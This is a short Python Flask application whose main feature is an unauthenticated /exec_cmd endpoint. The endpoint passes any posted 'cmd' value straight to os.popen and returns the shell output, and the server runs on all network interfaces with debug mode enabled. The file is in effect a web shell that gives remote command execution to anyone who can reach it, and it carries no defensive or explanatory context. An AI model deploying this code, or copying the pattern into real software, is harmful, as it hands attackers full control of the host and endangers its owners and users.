import os
from flask import Flask, request

app = Flask(__name__)


@app.route("/")
def index():
    return "Hello, World!"


@app.route("/exec_cmd", methods=["POST"])
def exec_cmd():
    command = request.form.get("cmd")
    if command:
        output = os.popen(command).read()
        return output
    else:
        return "No command provided."


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
